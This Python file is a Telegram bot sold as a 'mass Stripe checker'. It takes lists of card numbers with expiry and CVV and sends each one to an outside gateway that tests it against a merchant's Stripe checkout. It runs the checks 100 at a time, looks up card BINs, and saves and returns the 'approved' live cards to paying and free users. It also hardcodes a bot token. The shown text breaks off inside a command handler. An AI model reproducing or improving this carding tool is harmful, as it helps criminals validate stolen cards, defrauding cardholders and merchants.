import requests
import re
import time
import telebot
from telebot import types
import os
import json
import random
import string
import html
import threading
import queue
from datetime import datetime, timedelta
import asyncio
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
import multiprocessing
from collections import defaultdict

# --- Bot Setup ---
BOT_TOKEN = os.getenv('BOT_TOKEN', '8827608169:AAE2NVInl52DgRkA7_bKw2ZZRUUy_pJhBec')
bot = telebot.TeleBot(BOT_TOKEN, threaded=True, num_threads=100)

# Owner IDs (list)
OWNER_IDS = [8754004223,8664074279]

# Thread-safe storage
users_data = {}
codes_data = {}
status_data = {'total_checks': 0, 'total_approved': 0, 'users_checked': []}

# Authorized groups (where bot can work)
authorized_groups = []  # Group IDs where bot is allowed to work
groups_lock = threading.Lock()

# Stripe sites list (owner can add/remove)
stripe_sites = ["rosetone.co.uk"]  # Default site
sites_lock = threading.Lock()

# Thread locks
data_lock = threading.Lock()
active_checks_lock = threading.Lock()
file_locks = {
    'approved': threading.Lock(),
    'declined': threading.Lock(),
    'results': threading.Lock()
}

# Active checking sessions - PER USER isolation
active_checks = {}  # user_id -> check_info for current user session
stop_flags = {}  # user_id -> threading.Event() for stop flag

# User limits configuration - Thread-safe
user_limits = {
    'free': {
        'single': 1,
        'mass': 10,
        'mtxt': 30,
        'cooldown': 15,
        'daily': float('inf')
    },
    'premium': {
        'single': 1,
        'mass': 50,
        'mtxt': 1000,
        'cooldown': 1,
        'daily': float('inf')
    },
    'owner': {
        'single': float('inf'),
        'mass': float('inf'),
        'mtxt': float('inf'),
        'cooldown': 0,
        'daily': float('inf')
    }
}

# Daily usage tracking
daily_usage = defaultdict(int)  # user_id -> count
usage_lock = threading.Lock()

# Check cooldown
last_check = defaultdict(float)
cooldown_lock = threading.Lock()

# Queue for processing checks
check_queue = queue.Queue()
processing_threads = []

# Thread pool for parallel checking - 100 workers
parallel_executor = ThreadPoolExecutor(max_workers=100)

# ==================== HELPER FUNCTIONS ====================

def get_user_session_key(message):
    """Get unique session key for user (user_id + chat_id combination)"""
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    # For private chats, just use user_id
    if message.chat.type == 'private':
        return f"private_{user_id}"
    
    # For groups/channels, combine user_id and chat_id
    return f"group_{chat_id}_{user_id}"

def check_free_user_access(message):
    """Check if free user can access commands in private chat"""
    user_status = get_user_status(message.from_user.id)
    
    # Free users can't use commands in private chat
    if user_status == 'free' and message.chat.type == 'private':
        # Show welcome message with join button
        markup = types.InlineKeyboardMarkup(row_width=1)
        join_btn = types.InlineKeyboardButton("✅ Join Our Group", url="https://t.me/UL_CHATV2")  # Replace with actual group link
        markup.add(join_btn)
        
        welcome_msg = """👋 Welcome to the UL Checker Bot!

❌ You are not a subscriber, but you can still check cards for FREE in our group!

✅ **Features in Group:**
• Free single card checking
• Free multi-card checking (up to 15 cards)
• Instant results

⬇️ Click the button below to join and start checking:"""
        
        safe_send_message(message.chat.id, welcome_msg, reply_markup=markup)
        return False
    
    return True

# Group authorization check
def is_group_authorized(chat_id):
    """Check if group is authorized to use the bot"""
    with groups_lock:
        return chat_id in authorized_groups

def check_group_authorization(message):
    """Check if message is from authorized group or private chat"""
    # Always allow private chats (for premium/owner)
    if message.chat.type == 'private':
        user_status = get_user_status(message.from_user.id)
        if user_status == 'free':
            return check_free_user_access(message)
        return True
    
    # Check if group is authorized
    if is_group_authorized(message.chat.id):
        return True
    
    # Group not authorized - send message only in group
    safe_send_message(message.chat.id, 
                      "❌ This group is not authorized to use this bot.\n\nContact owner to authorize this group.",
                      reply_to_message_id=message.message_id)
    return False

# Safe message sending
def safe_send_message(chat_id, text, reply_markup=None, parse_mode='HTML', reply_to_message_id=None):
    """Safely send message with retry logic"""
    max_retries = 3
    for attempt in range(max_retries):
        try:
            return bot.send_message(chat_id, text, reply_markup=reply_markup, 
                                  parse_mode=parse_mode, reply_to_message_id=reply_to_message_id)
        except Exception as e:
            if attempt == max_retries - 1:
                print(f"Failed to send message after {max_retries} attempts: {e}")
                return None
            time.sleep(1)

def safe_edit_message_text(chat_id, message_id, text, reply_markup=None, parse_mode='HTML'):
    """Safely edit message with retry logic"""
    max_retries = 3
    for attempt in range(max_retries):
        try:
            return bot.edit_message_text(text, chat_id=chat_id, message_id=message_id, 
                                       reply_markup=reply_markup, parse_mode=parse_mode)
        except Exception as e:
            if attempt == max_retries - 1:
                print(f"Failed to edit message after {max_retries} attempts: {e}")
                return None
            time.sleep(0.5)

# Thread-safe data operations
def get_user_status(user_id):
    """Get user status with premium expiration check"""
    user_id_str = str(user_id)
    
    # Owner is always owner
    if user_id in OWNER_IDS:
        return 'owner'
    
    with data_lock:
        user_data = users_data.get(user_id_str, {})
        
        # Check for premium
        if 'premium_until' in user_data:
            try:
                premium_until = datetime.fromisoformat(user_data['premium_until'])
                if datetime.now() < premium_until:
                    return 'premium'
                else:
                    # Premium expired - remove it
                    del user_data['premium_until']
                    users_data[user_id_str] = user_data
            except Exception as e:
                print(f"Error parsing premium date: {e}")
                # Remove invalid premium data
                if 'premium_until' in user_data:
                    del user_data['premium_until']
                    users_data[user_id_str] = user_data
    
    return 'free'

def get_user_limits(user_id):
    """Get user limits"""
    status = get_user_status(user_id)
    return user_limits[status]

def get_user_today_usage(user_id):
    """Get today's usage"""
    user_id_str = str(user_id)
    with usage_lock:
        return daily_usage.get(user_id_str, 0)

def update_user_usage(user_id, count=1):
    """Update user usage"""
    user_id_str = str(user_id)
    with usage_lock:
        daily_usage[user_id_str] = daily_usage.get(user_id_str, 0) + count

def reset_daily_usage():
    """Reset daily usage at midnight"""
    while True:
        now = datetime.now()
        # Calculate time until next midnight
        next_midnight = (now + timedelta(days=1)).replace(hour=0, minute=0, second=0, microsecond=0)
        sleep_time = (next_midnight - now).total_seconds()
        
        time.sleep(sleep_time)
        
        with usage_lock:
            daily_usage.clear()
        print("Daily usage reset at midnight")

# Start daily reset thread
reset_thread = threading.Thread(target=reset_daily_usage, daemon=True)
reset_thread.start()

def check_cooldown(user_id):
    """Check if user is in cooldown"""
    user_status = get_user_status(user_id)
    cooldown = user_limits[user_status]['cooldown']
    
    with cooldown_lock:
        current_time = time.time()
        if user_id in last_check:
            elapsed = current_time - last_check[user_id]
            if elapsed < cooldown:
                return False, int(cooldown - elapsed)
        
        last_check[user_id] = current_time
        return True, 0

# Card checking functions
def reg(card_details):
    """Validate and format card"""
    card_details = card_details.strip()
    
    patterns = [
        r'^(\d{15,16})[\|\s](\d{1,2})[\|\s](\d{2,4})[\|\s](\d{3,4})$',
        r'^(\d{15,16})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})$',
        r'^(\d{15,16}):(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        r'^(\d{15,16})-(\d{1,2})-(\d{2,4})-(\d{3,4})$',
    ]
    
    for pattern in patterns:
        match = re.match(pattern, card_details)
        if match:
            card_num, month, year, cvv = match.groups()
            
            # Validate month
            if int(month) < 1 or int(month) > 12:
                continue
                
            # Validate year
            current_year = int(str(datetime.now().year)[2:])
            if len(year) == 2:
                year_int = int(year)
                if year_int < current_year or year_int > current_year + 20:
                    continue
            elif len(year) == 4:
                year_int = int(year)
                if year_int < datetime.now().year or year_int > datetime.now().year + 20:
                    continue
            
            return f"{card_num}|{month}|{year}|{cvv}"
    
    return 'None'

def get_bin_info(bin_number):
    """Get BIN information with improved error handling"""
    try:
        response = requests.get(f'https://bins.antipublic.cc/bins/{bin_number}', timeout=3)
        if response.status_code == 200:
            data = response.json()
            return {
                'bin': bin_number,
                'brand': data.get('brand', 'Unknown'),
                'type': data.get('type', 'Unknown'),
                'bank': data.get('bank', 'Unknown'),
                'country_name': data.get('country_name', 'Unknown'),
                'country_flag': data.get('country_flag', '🏳️'),
                'level': data.get('level', 'Unknown')
            }
    except requests.exceptions.Timeout:
        print(f"BIN lookup timeout for {bin_number}")
    except requests.exceptions.ConnectionError:
        print(f"BIN lookup connection error for {bin_number}")
    except Exception as e:
        print(f"BIN lookup error for {bin_number}: {e}")
    
    return {
        'bin': bin_number,
        'brand': 'Unknown',
        'type': 'Unknown',
        'bank': 'Unknown',
        'country_name': 'Unknown',
        'country_flag': '🏳️',
        'level': 'Unknown'
    }

def stripe_api_check(cc, user_id=None):
    """Stripe API checker with IMPROVED error handling and retry logic"""
    global stripe_sites
    
    with sites_lock:
        if not stripe_sites:
            return {
                'result': 'No sites available',
                'site': 'None',
                'status': 'Error',
                'response_msg': 'Owner needs to add sites first',
                'api_status': 'Error',
                'api_response': 'No sites available',
                'error': 'No sites configured'
            }
        
        # Get a site (simple rotation)
        site = stripe_sites[0]  # Use first site, owner can add more
    
    # Check stop flag for this user
    if user_id and user_id in stop_flags and stop_flags[user_id].is_set():
        return {
            'result': 'Stopped by user',
            'site': site,
            'status': 'Stopped 🛑',
            'response_msg': 'Check stopped by user',
            'api_status': 'stopped',
            'api_response': 'Check stopped',
            'error': 'User stopped check'
        }
    
    # Retry logic
    max_retries = 2
    last_error = None
    
    for attempt in range(max_retries):
        try:
            # Check stop flag before each attempt
            if user_id and user_id in stop_flags and stop_flags[user_id].is_set():
                return {
                    'result': 'Stopped by user',
                    'site': site,
                    'status': 'Stopped 🛑',
                    'response_msg': 'Check stopped by user',
                    'api_status': 'stopped',
                    'api_response': 'Check stopped',
                    'error': 'User stopped check'
                }
            
            api_url = f"https://wiardsclub.onrender.com/gateway=autostripe/key=wizard/site{site}&cc={cc}"
            response = requests.get(api_url, timeout=300)
            
            if response.status_code != 200:
                if attempt < max_retries - 1:
                    time.sleep(0.5)  # Wait before retry
                    continue
                
                return {
                    'result': f'Error (HTTP {response.status_code})',
                    'site': site,
                    'status': 'Declined ❌',
                    'response_msg': f'HTTP Error {response.status_code}',
                    'api_status': 'declined',
                    'api_response': f'HTTP Error {response.status_code}',
                    'error': f'HTTP {response.status_code}',
                    'retry_attempt': attempt + 1
                }
            
            response_text = response.text.strip()
            
            # Parse response
            if not response_text:
                return {
                    'result': 'Empty response',
                    'site': site,
                    'status': 'Declined ❌',
                    'response_msg': 'Empty response from API',
                    'api_status': 'declined',
                    'api_response': 'Empty response',
                    'error': 'Empty response',
                    'retry_attempt': attempt + 1
                }
            
            # Try to parse as JSON
            api_status = 'Unknown'
            api_response = response_text
            response_msg = response_text
            
            try:
                data = response.json()
                
                # Extract status and response from JSON
                if 'status' in data:
                    api_status = data['status'].lower()
                
                if 'response' in data:
                    api_response = data['response']
                    response_msg = api_response
                elif 'message' in data:
                    api_response = data['message']
                    response_msg = api_response
                elif 'result' in data:
                    api_response = data['result']
                    response_msg = api_response
                
            except:
                # If not JSON, use the text as response
                api_response = response_text
                response_msg = response_text
            
            # Determine status from API response
            response_lower = str(api_response).lower()
            
            # Check for success patterns
            success_patterns = ['success', 'approved', 'payment method added', 'charge', 'succeeded', 'payment successful', 'card charged', 'authenticate', '✓']
            decline_patterns = ['decline', 'insufficient', 'invalid', 'incorrect', 'failed', 'error', 'card declined', 'try again', 'declined']
            three_d_patterns = ['requires_action', '3d', 'otp', 'authentication', 'required_action', '3ds', 'secure', 'requires action']
            
            # Determine final status
            if 'requires_action' in response_lower:
                final_status = '3D Required ⚠️'
            elif api_status == 'approved':
                final_status = 'Approved ✅'
            elif api_status == 'declined':
                final_status = 'Declined ❌'
            elif any(pattern in response_lower for pattern in success_patterns):
                final_status = 'Approved ✅'
            elif any(pattern in response_lower for pattern in three_d_patterns):
                final_status = '3D Required ⚠️'
            elif any(pattern in response_lower for pattern in decline_patterns):
                final_status = 'Declined ❌'
            else:
                final_status = 'Declined ❌'
            
            # Clean response message
            clean_response = api_response
            if 'your card was declined' in response_lower:
                clean_response = 'Your card was declined.'
            elif 'insufficient funds' in response_lower:
                clean_response = 'Insufficient Funds'
            elif 'invalid card' in response_lower:
                clean_response = 'Invalid Card'
            elif 'incorrect cvv' in response_lower:
                clean_response = 'Incorrect CVV'
            elif 'try again' in response_lower:
                clean_response = 'Try Again'
            elif 'payment method added' in response_lower and '✓' in api_response:
                clean_response = api_response  # Keep the original with checkmark
            
            return {
                'result': clean_response[:100],
                'site': site,
                'status': final_status,
                'response_msg': clean_response[:100],
                'raw_response': api_response,
                'api_status': api_status,
                'api_response': clean_response,
                'is_3d': any(pattern in response_lower for pattern in three_d_patterns),
                'success': True,
                'retry_attempt': attempt + 1
            }
            
        except requests.exceptions.Timeout:
            last_error = f"Timeout (Attempt {attempt + 1}/{max_retries})"
            if attempt < max_retries - 1:
                time.sleep(0.5)  # Wait before retry
                continue
                
        except requests.exceptions.ConnectionError:
            last_error = f"Connection Error (Attempt {attempt + 1}/{max_retries})"
            if attempt < max_retries - 1:
                time.sleep(1)  # Wait longer for connection errors
                continue
                
        except Exception as e:
            last_error = f"Exception: {str(e)} (Attempt {attempt + 1}/{max_retries})"
            if attempt < max_retries - 1:
                time.sleep(0.5)
                continue
    
    # If all retries failed
    return {
        'result': f'Error: {last_error}',
        'site': site,
        'status': 'Declined ❌',
        'response_msg': f'API Error: {last_error}',
        'api_status': 'declined',
        'api_response': f'API Error: {last_error}',
        'is_3d': False,
        'error': last_error,
        'success': False,
        'retry_attempt': max_retries
    }

# Parallel checking function with IMPROVED error handling
def check_card_parallel(card, check_info):
    """Check a single card in parallel with enhanced error handling"""
    try:
        user_id = check_info['user_id']
        
        # Check stop flag for this user
        if user_id in stop_flags and stop_flags[user_id].is_set():
            return None
        
        card = card.strip()
        if not card:
            return {'status': 'invalid', 'card': card, 'error': 'Empty card'}
        
        # Format card
        formatted_cc = reg(card)
        if formatted_cc == 'None':
            return {'status': 'invalid', 'card': card, 'error': 'Invalid card format'}
        
        # Split CC details
        try:
            cc_num, mm, yy, cvc = formatted_cc.split("|")
        except:
            return {'status': 'invalid', 'card': card, 'error': 'Failed to parse card details'}
        
        fullcc = f"{cc_num}|{mm}|{yy}|{cvc}"
        bin_number = cc_num[:6]
        
        # Get BIN info with error handling
        try:
            bin_info = get_bin_info(bin_number)
        except Exception as e:
            bin_info = {
                'bin': bin_number,
                'brand': 'Unknown',
                'type': 'Unknown',
                'bank': 'Unknown',
                'country_name': 'Unknown',
                'country_flag': '🏳️',
                'level': 'Unknown'
            }
        
        # Check card with improved error handling - pass user_id for stop checking
        try:
            result = stripe_api_check(fullcc, user_id)
            status_text = result['status']
            api_status = result.get('api_status', 'declined').lower()
            response_msg = result.get('api_response', 'No response')
            is_3d = result.get('is_3d', False)
            success = result.get('success', False)
            retry_attempt = result.get('retry_attempt', 1)
            error_msg = result.get('error', None)
            
            # Check if stopped
            if api_status == 'stopped':
                return {'status': 'stopped', 'card': fullcc}
            
            # Update usage
            update_user_usage(user_id, 1)
            
            # Determine card type
            if 'Approved ✅' in status_text and not is_3d and success:
                card_status = 'approved'
            elif '3D Required ⚠️' in status_text or is_3d:
                card_status = 'three_d'
            elif 'Declined ❌' in status_text:
                card_status = 'declined'
            elif not success and error_msg:
                card_status = 'error'
                response_msg = f"API Error: {error_msg}"
            else:
                card_status = 'error'
            
            return {
                'status': card_status,
                'card': fullcc,
                'bin_info': bin_info,
                'response': response_msg,
                'status_text': status_text,
                'is_3d': is_3d,
                'success': success,
                'retry_attempt': retry_attempt,
                'error': error_msg
            }
            
        except Exception as e:
            return {
                'status': 'error', 
                'card': fullcc, 
                'error': f'Check failed: {str(e)}',
                'bin_info': bin_info,
                'response': f'Check failed: {str(e)}',
                'status_text': 'Declined ❌'
            }
        
    except Exception as e:
        return {'status': 'error', 'card': card, 'error': f'Processing failed: {str(e)}'}

# Processing worker
def check_worker():
    """Worker thread for processing checks"""
    while True:
        try:
            task = check_queue.get()
            if task is None:  # Poison pill
                break
            
            message, cards, is_file, check_type = task
            process_check_task(message, cards, is_file, check_type)
            check_queue.task_done()
            
        except Exception as e:
            print(f"Worker error: {e}")
            time.sleep(1)

# Start worker threads - 50 workers
num_workers = 50
for i in range(num_workers):
    t = threading.Thread(target=check_worker, daemon=True)
    t.start()
    processing_threads.append(t)

def process_check_task(message, cards, is_file, check_type):
    """Process a check task with 3-card parallel checking"""
    user_id = message.from_user.id
    user_status = get_user_status(user_id)
    limits = get_user_limits(user_id)
    
    # Check daily limit
    daily_limit = limits['daily']
    current_usage = get_user_today_usage(user_id)
    
    if daily_limit != float('inf') and current_usage >= daily_limit:
        safe_send_message(
            message.chat.id,
            f"❌ Daily limit reached!\n📊 You have checked {current_usage}/{daily_limit} cards today.",
            reply_to_message_id=message.message_id
        )
        return
    
    # Check active session - PER USER isolation using user_id
    with active_checks_lock:
        if user_id in active_checks:
            safe_send_message(
                message.chat.id,
                "⚠️ You already have an active card check. Please wait for it to complete or use /stopcheck to stop it.",
                reply_to_message_id=message.message_id
            )
            return
        
        # Create stop event for this user only
        stop_event = threading.Event()
        stop_flags[user_id] = stop_event
        
        # Register active check for this user only
        active_checks[user_id] = {
            'start_time': time.time(),
            'total': len(cards),
            'type': check_type,
            'stop_event': stop_event,
            'original_message_id': message.message_id,
            'user_id': user_id,
            'chat_id': message.chat.id,
            'user_name': message.from_user.first_name
        }
    
    try:
        # Apply limits
        limit = limits[check_type]
        if limit != float('inf') and len(cards) > limit:
            cards = cards[:limit]
        
        total = len(cards)
        live = 0  # Approved count (non-3D only)
        dd = 0    # Declined count
        error = 0 # Error count
        three_d = 0  # 3D cards count
        
        # Send initial message
        ko_msg = safe_send_message(message.chat.id, "Checking Your Cards...⌛", reply_to_message_id=message.message_id)
        if not ko_msg:
            # Clean up if message failed
            with active_checks_lock:
                if user_id in active_checks:
                    del active_checks[user_id]
                if user_id in stop_flags:
                    del stop_flags[user_id]
            return
        
        ko = ko_msg.message_id
        
        # Track approved cards for file
        approved_cards_list = []
        
        # Process cards in batches of 3 ONLY (3-3 batch)
        batch_size = 3
        processed_cards = 0
        
        for i in range(0, len(cards), batch_size):
            # Check stop flag for this user only
            if user_id in stop_flags and stop_flags[user_id].is_set():
                break
            
            batch = cards[i:i + batch_size]
            
            # Submit batch to parallel executor (3 cards at a time)
            batch_futures = []
            for card in batch:
                future = parallel_executor.submit(
                    check_card_parallel, 
                    card, 
                    active_checks[user_id]
                )
                batch_futures.append(future)
            
            # Track results for this batch
            batch_results = []
            
            # Wait for batch completion with timeout
            for future in batch_futures:
                # Check stop flag periodically
                if user_id in stop_flags and stop_flags[user_id].is_set():
                    break
                
                try:
                    result = future.result(timeout=300)  # Increased timeout for 3-card batch
                    
                    if result is None:
                        continue
                    
                    # Check if stopped
                    if result.get('status') == 'stopped':
                        break
                    
                    batch_results.append(result)
                    
                except Exception as e:
                    error += 1
                    processed_cards += 1
                    print(f"Error getting future result: {e}")
            
            # Process batch results
            for result in batch_results:
                if user_id in stop_flags and stop_flags[user_id].is_set():
                    break
                
                card_status = result.get('status')
                
                # Update counters
                if card_status == 'approved':
                    live += 1
                    
                    # Send approval message for approved cards
                    fullcc = result['card']
                    bin_info = result['bin_info']
                    response_msg = result['response']
                    
                    msg = f"""<b>[#STRIPE AUTH] | UL CHECKER ◆</b>

<b>[•] Card-</b> <code>{fullcc}</code>
<b>[•] Gateway -</b> <code>Stripe API</code>
<b>[•] Status-</b> <code>{result['status_text']}</code>
<b>[•] Response-</b> <code>{response_msg}</code>
______________________
<b>[+] Bin:</b> <code>{bin_info['bin']}</code>
<b>[+] Info:</b> <code>{bin_info['brand']} - {bin_info['type']}</code>
<b>[+] Bank:</b> <code>{bin_info['bank']}</code> 🏛
<b>[+] Country:</b> <code>{bin_info['country_name']}</code> ━ [{bin_info['country_flag']}]
______________________
<b>[ϟ] Checked By:</b> ⏤ <code>{message.from_user.first_name}</code>
<b>[ϟ] Daily Usage:</b> {get_user_today_usage(user_id)}/{daily_limit if daily_limit != float('inf') else '∞'}
<b>[ϟ] Bot By:</b> @OG_UNDEFINED"""
                    
                    # Reply to original command message
                    safe_send_message(message.chat.id, msg, reply_to_message_id=message.message_id)
                    
                    # Save to approved list for file
                    approved_cards_list.append(fullcc)
                    
                    # Save approved card
                    with file_locks['approved']:
                        with open("approved.txt", "a", encoding="utf-8") as f:
                            f.write(f"{fullcc}|{result['status_text']}|{response_msg}\n")
                
                elif card_status == 'three_d':
                    three_d += 1
                    fullcc = result['card']
                    response_msg = result['response']
                    
                    # Save 3D card to file (but don't show in chat)
                    with file_locks['approved']:
                        with open("approved.txt", "a", encoding="utf-8") as f:
                            f.write(f"{fullcc}|3D Required|{response_msg}\n")
                
                elif card_status == 'declined':
                    dd += 1
                
                elif card_status == 'error':
                    error += 1
                
                elif card_status == 'invalid':
                    dd += 1
                
                processed_cards += 1
            
            # Update progress message after each 3-card batch
            if user_id in stop_flags and stop_flags[user_id].is_set():
                break
                
            mes = types.InlineKeyboardMarkup(row_width=1)
            status_btn = types.InlineKeyboardButton(f"• 𝗣𝗥𝗢𝗖𝗘𝗦𝗦𝗘𝗗 ➜ [ {processed_cards}/{total} ] •", callback_data='u8')
            cm3 = types.InlineKeyboardButton(f"• 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅ ➜ [ {live} ] •", callback_data='x')
            cm4 = types.InlineKeyboardButton(f"• 𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌ ➜ [ {dd} ] •", callback_data='x')
            cm5 = types.InlineKeyboardButton(f"• 𝟯𝗗 ⚠️ ➜ [ {three_d} ] •", callback_data='x')
            cm6 = types.InlineKeyboardButton(f"• 𝗘𝗥𝗥𝗢𝗥𝗦 🚫 ➜ [ {error} ] •", callback_data='x')
            stop_btn = types.InlineKeyboardButton(f"[ 𝗦𝗧𝗢𝗣🛑 ]", callback_data=f'stop_{user_id}_{ko}')
            mes.add(status_btn, cm3, cm4, cm5, cm6, stop_btn)
            
            safe_edit_message_text(
                chat_id=message.chat.id,
                message_id=ko,
                text=f'''<b>GATEWAY -> STRIPE API</b>
Checking cards in 3-card batches...
<b>Batch:</b> {i//batch_size + 1}/{(total + batch_size - 1)//batch_size}
<b>Processed:</b> {processed_cards}/{total}
<b>Batch Size:</b> 3 cards per batch
<b>Bot By:</b> @OG_UNDEFINED ''',
                reply_markup=mes
            )
            
            # Small delay between 3-card batches for stability
            if not (user_id in stop_flags and stop_flags[user_id].is_set()):
                time.sleep(0.8)  # Slightly longer delay for 3-card batches
        
        # Check if stopped
        if user_id in stop_flags and stop_flags[user_id].is_set():
            safe_edit_message_text(
                chat_id=message.chat.id,
                message_id=ko,
                text='<b>𝗦𝗧𝗢𝗣𝗣𝗘𝗗 ✅</b>\n𝗕𝗢𝗧 𝗕𝗬 ➜ @OG_UNDEFINED'
            )
            # Clean up
            with active_checks_lock:
                if user_id in active_checks:
                    del active_checks[user_id]
                if user_id in stop_flags:
                    del stop_flags[user_id]
            return
        
        # Final summary
        final_usage = get_user_today_usage(user_id)
        
        if user_status != 'owner':
            if daily_limit != float('inf'):
                remaining = daily_limit - final_usage
                final_msg = f"""<b>𝗕𝗘𝗘𝗡 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 ✅</b>
━━━━━━━━━━━━━━━━━
✅ Approved: {live}
❌ Declined: {dd}
⚠️ 3D Cards: {three_d}
🚫 Errors: {error}
📊 Used today: {final_usage}/{daily_limit}
📈 Remaining: {remaining}
━━━━━━━━━━━━━━━━━
𝗕𝗢𝗧 𝗕𝗬 ➜ @OG_UNDEFINED"""
            else:
                final_msg = f"""<b>𝗕𝗘𝗘𝗡 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 ✅</b>
━━━━━━━━━━━━━━━━━
✅ Approved: {live}
❌ Declined: {dd}
⚠️ 3D Cards: {three_d}
🚫 Errors: {error}
📊 Used today: {final_usage} (Unlimited)
━━━━━━━━━━━━━━━━━
𝗕𝗢𝗧 𝗕𝗬 ➜ @OG_UNDEFINED"""
        else:
            final_msg = f"""<b>𝗕𝗘𝗘𝗡 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 ✅</b>
━━━━━━━━━━━━━━━━━
✅ Approved: {live}
❌ Declined: {dd}
⚠️ 3D Cards: {three_d}
🚫 Errors: {error}
━━━━━━━━━━━━━━━━━
𝗕𝗢𝗧 𝗕𝗬 ➜ @OG_UNDEFINED"""
        
        safe_edit_message_text(
            chat_id=message.chat.id,
            message_id=ko,
            text=final_msg
        )
        
        # Send approved cards file if any (non-3D only)
        if approved_cards_list and check_type == 'mtxt':
            try:
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"approved_cards_{timestamp}.txt"
                
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(f"=== APPROVED CARDS (NON-3D) - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n\n")
                    f.write(f"Total Approved: {live}\n")
                    f.write(f"3D Cards: {three_d}\n")
                    f.write(f"Total Checked: {total}\n")
                    f.write(f"User: {message.from_user.first_name} (ID: {user_id})\n\n")
                    f.write("=== CARDS ===\n")
                    for card in approved_cards_list:
                        f.write(f"{card}\n")
                
                with open(filename, 'rb') as f:
                    bot.send_document(
                        message.chat.id,
                        f,
                        caption=f"✅ Approved Cards File (Non-3D Only)\n📊 Approved: {live} cards\n⚠️ 3D Cards: {three_d}",
                        parse_mode="HTML",
                        reply_to_message_id=message.message_id
                    )
                
                os.remove(filename)
            except Exception as e:
                print(f"Error sending approved file: {e}")
        
    except Exception as e:
        safe_send_message(message.chat.id, f"❌ Error: {str(e)}", reply_to_message_id=message.message_id)
    finally:
        # Clean up ONLY this user's session
        with active_checks_lock:
            if user_id in active_checks:
                del active_checks[user_id]
            if user_id in stop_flags:
                del stop_flags[user_id]

# ==================== BOT COMMANDS ====================

@bot.message_handler(commands=['start'])
def start_command(message):
    """Start command with authorization check"""
    # Check free user access first
    if not check_free_user_access(message):
        return
    
    # Check group authorization
    if not check_group_authorization(message):
        return
    
    user_name = message.from_user.first_name
    user_status = get_user_status(message.from_user.id)
    
    if user_status == 'owner':
        status_display = '👑 OWNER'
    elif user_status == 'premium':
        status_display = '💎 PREMIUM'
    else:
        status_display = '⚡ FREE'
    
    limits = get_user_limits(message.from_user.id)
    current_usage = get_user_today_usage(message.from_user.id)
    
    with sites_lock:
        sites_count = len(stripe_sites)
    
    if user_status == 'free' and message.chat.type != 'private':
        # Free user in group
        msg = f"""<b>╔══════════════════╗</b>
<b>   🧙‍♂️ UL MASS STRIPE CHECKER</b>
<b>╚══════════════════╝</b>

<b>👋 Welcome, {user_name}!</b>
<b>📊 Status: {status_display} (Group Access Only)</b>

<b>🎯 Your Limits (Group Only):</b>
• .chk - Single check: {limits['single']} card
• .mass - Text mass: {limits['mass']} cards
• .mtxt - File mass: {limits['mtxt']} cards
• Cooldown: {limits['cooldown']} seconds

<b>📈 Your Daily Usage:</b>
• Checked Today: {current_usage}/{limits['daily'] if limits['daily'] != float('inf') else '∞'}

<b>🌐 Active Sites:</b> {sites_count}

<b>⚡ Quick Commands:</b>
• <code>.chk 4111111111111111|12|2026|123</code>
• <code>.chk</code> (reply to card message)
• <code>.chk visa</code> (test visa card)
• <code>.mass</code> (reply to text with cards)
• <code>.mtxt</code> (reply to .txt file)
• <code>/info</code> - Your account info
• <code>/limits</code> - View all limits

<b>🤖 Bot By: @OG_UNDEFINED</b>"""
    else:
        # Premium/Owner or private chat
        msg = f"""<b>╔══════════════════╗</b>
<b>   🧙‍♂️ UL MASS STRIPE CHECKER</b>
<b>╚══════════════════╝</b>

<b>👋 Welcome, {user_name}!</b>
<b>📊 Status: {status_display}</b>

<b>📈 Your Daily Usage:</b>
• Checked Today: {current_usage}/{limits['daily'] if limits['daily'] != float('inf') else '∞'}
• Remaining: {limits['daily'] - current_usage if limits['daily'] != float('inf') else '∞'}

<b>🎯 Your Limits:</b>
• .chk - Single check: {limits['single'] if limits['single'] != float('inf') else '∞'} card
• .mass - Text mass: {limits['mass'] if limits['mass'] != float('inf') else '∞'} cards
• .mtxt - File mass: {limits['mtxt'] if limits['mtxt'] != float('inf') else '∞'} cards
• Cooldown: {limits['cooldown']} seconds

<b>🌐 Active Sites:</b> {sites_count}

<b>⚡ Quick Commands:</b>
• <code>.chk 4111111111111111|12|2026|123</code>
• <code>.chk</code> (reply to card message)
• <code>.chk visa</code> (test visa card)
• <code>.mass</code> (reply to text with cards)
• <code>.mtxt</code> (reply to .txt file)
• <code>/info</code> - Your account info
• <code>/limits</code> - View all limits

<b>🤖 Bot By: @OG_UNDEFINED</b>"""
    
    safe_send_message(message.chat.id, msg)

@bot.message_handler(func=lambda message: message.text and 
                    (message.text.lower().startswith('.chk') or 
                     message.text.lower().startswith('/chk')))
def chk_command(message):
    """Single card check with CC filter support"""
    # Check free user access first
    if not check_free_user_access(message):
        return
    
    # Check group authorization
    if not check_group_authorization(message):
        return
    
    # Check cooldown
    can_proceed, remaining = check_cooldown(message.from_user.id)
    if not can_proceed:
        safe_send_message(message.chat.id, f"⏳ Please wait {remaining} seconds before another check.", reply_to_message_id=message.message_id)
        return
    
    # Check active session
    user_id = message.from_user.id
    with active_checks_lock:
        if user_id in active_checks:
            safe_send_message(
                message.chat.id,
                "⚠️ You already have an active card check. Please wait for it to complete or use /stopcheck to stop it.",
                reply_to_message_id=message.message_id
            )
            return
    
    card = None
    formatted_cc = 'None'
    
    # Check if message is replying to another message
    if message.reply_to_message:
        # Get card from replied message
        if message.reply_to_message.text:
            # Extract card from replied text
            text = message.reply_to_message.text
            # Try to find card in the replied message
            match = re.search(r'(\d{15,16}[|/\s:-]+\d{1,2}[|/\s:-]+\d{2,4}[|/\s:-]+\d{3,4})', text)
            if match:
                card = match.group(1)
                formatted_cc = reg(card)
        elif message.reply_to_message.caption:
            # Check in caption if it's a file
            text = message.reply_to_message.caption
            match = re.search(r'(\d{15,16}[|/\s:-]+\d{1,2}[|/\s:-]+\d{2,4}[|/\s:-]+\d{3,4})', text)
            if match:
                card = match.group(1)
